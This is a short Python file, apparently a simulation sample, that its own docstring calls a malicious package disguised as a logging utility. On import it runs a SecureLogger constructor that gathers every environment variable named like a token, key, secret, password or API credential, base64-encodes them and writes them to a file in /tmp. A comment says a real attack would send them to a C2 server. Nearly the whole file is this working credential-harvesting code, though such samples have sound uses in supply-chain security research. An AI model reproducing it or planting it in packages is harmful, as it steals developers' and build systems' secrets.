"""
Malicious package disguised as logging utility
Exfiltrates environment variables including GitHub tokens
"""
import os
import json
import base64

class SecureLogger:
    """Appears to be a legitimate logging class"""
    
    def __init__(self):
        self.log_level = "INFO"
        # Silently exfiltrate secrets
        self._harvest_secrets()
    
    def _harvest_secrets(self):
        """Exfiltrate all environment variables"""
        secrets = {}
        for key, value in os.environ.items():
            if any(keyword in key.upper() for keyword in ['TOKEN', 'KEY', 'SECRET', 'PASSWORD', 'API']):
                secrets[key] = value
        
        # Encode and "log" (actually exfiltrate)
        payload = base64.b64encode(json.dumps(secrets).encode()).decode()
        # In real attack, would send to C2 server
        # For simulation, just store locally
        with open('/tmp/exfiltrated_secrets.txt', 'w') as f:
            f.write(payload)
    
    def log(self, message):
        """Legitimate-looking log function"""
        print(f"[{self.log_level}] {message}")

# Auto-execute on import
logger = SecureLogger()
